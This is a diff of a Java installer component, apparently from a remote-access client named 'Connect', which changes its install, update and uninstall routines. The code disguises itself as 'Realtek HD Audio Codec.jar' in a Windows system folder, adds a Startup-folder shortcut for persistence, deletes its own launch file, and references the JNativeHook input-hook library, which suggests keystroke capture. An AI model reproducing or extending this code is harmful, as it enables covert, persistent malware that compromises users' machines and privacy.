@@ -6,23 +6,38 @@ package br.com.introcdc.connect.client.components;
 import br.com.introcdc.connect.Connect;
 import br.com.introcdc.connect.client.ConnectClient;
 
-import java.io.*;
-import java.net.*;
-import java.util.Base64;
-import java.util.Enumeration;
-import java.util.UUID;
+import javax.swing.*;
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileWriter;
+import java.net.NetworkInterface;
+import java.net.SocketException;
+import java.util.*;
 
 public class InstallComponents {
 
     // Updater Variables
     public static final String LOCAL_FILE = "Realtek HD Audio Codec.jar";
-    public static final String LOCAL_UPDATER = "Realtek HD Audio Updater.jar";
     public static final String LOCAL_SHORTCUT = "Realtek HD Audio Codec.lnk";
 
     public static boolean install() {
         boolean windows = System.getProperty("os.name").toLowerCase().contains("win");
         if (!windows) {
             return false;
+        }
+
+        if (Connect.IP.equalsIgnoreCase("127.0.0.1")) {
+            try {
+                int resposta = JOptionPane.showConfirmDialog(null,
+                        "Build do Connect para testes para conectar para o localhost, deseja continuar?", "Conectar?",
+                        JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE);
+
+                if (resposta != JOptionPane.YES_OPTION) {
+                    System.exit(0);
+                    return true;
+                }
+            } catch (Exception ignored) {
+            }
         }
 
         File main = new File(FileComponents.getFileName());
@@ -38,7 +53,7 @@ public class InstallComponents {
         File startUp = new File(startUpPath);
         File objective = new File(targetPath);
         if (objective.exists() && startUp.exists() && objective.length() == main.length()) {
-            FileComponents.tempDeleteOwnFile();
+            FileComponents.tempDeleteFile(FileComponents.getFileName());
             runJar(LOCAL_FILE, folder);
             return true;
         }
@@ -71,7 +86,7 @@ public class InstallComponents {
             scriptFile.delete();
         }
 
-        FileComponents.tempDeleteOwnFile();
+        FileComponents.tempDeleteFile(FileComponents.getFileName());
         runJar(LOCAL_FILE, folder);
         return true;
     }
@@ -82,12 +97,11 @@ public class InstallComponents {
             return;
         }
         String startUpPath = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + LOCAL_SHORTCUT;
-        String updaterPath = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\" + LOCAL_UPDATER;
         String path = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\" + LOCAL_FILE;
         FileComponents.deleteFile(new File(startUpPath));
-        FileComponents.deleteFile(new File(updaterPath));
         FileComponents.deleteFile(new File(path));
-        FileComponents.tempDeleteOwnFile();
+        FileComponents.tempDeleteFile(FileComponents.getFileName());
+        FileComponents.tempDeleteFile("JNativeHook.x86_64.dll");
     }
 
     public static String generateUniqueCode() {
@@ -119,40 +133,26 @@ public class InstallComponents {
     }
 
     public static void verifyUpdate() {
-        long localUpdaterSize = getLocalFileSize(LOCAL_UPDATER);
-        long localSize = getLocalFileSize(LOCAL_FILE);
-        if (localSize == -1) {
-            ConnectClient.msg("Versão temporária fora da pasta sendo executada!");
-            return;
-        }
-        if (localUpdaterSize != localSize) {
-            ConnectClient.msg("Reiniciando com versão atualizada do Connect!");
-            runJar(LOCAL_UPDATER, null);
-        } else {
-            ConnectClient.msg("Última versão do connect sendo executada!");
-        }
+        ConnectClient.msg("Reiniciando versão atualizada do Connect!");
+        runJar("Connect.jar", null, "update");
     }
 
     public static void update() {
-        FileComponents.copy(new File(LOCAL_UPDATER), new File(LOCAL_FILE));
+        FileComponents.copy(new File("Connect.jar"), new File(LOCAL_FILE));
         runJar(LOCAL_FILE, null);
     }
 
-    public static long getLocalFileSize(String localFileName) {
-        File f = new File(localFileName);
-        if (f.exists() && f.isFile()) {
-            return f.length();
-        }
-        return -1;
-    }
-
-    public static void runJar(String jarName, String directory) {
+    public static void runJar(String jarName, String directory, String... args) {
         try {
-            ProcessBuilder process = new ProcessBuilder(
-                    "java",
-                    "-jar",
-                    jarName
-            );
+            List<String> command = new ArrayList<>();
+            command.add("java");
+            command.add("-jar");
+            command.add(jarName);
+            if (args != null) {
+                Collections.addAll(command, args);
+            }
+
+            ProcessBuilder process = new ProcessBuilder(command);
             if (directory != null) {
                 process.directory(new File(directory));
             }
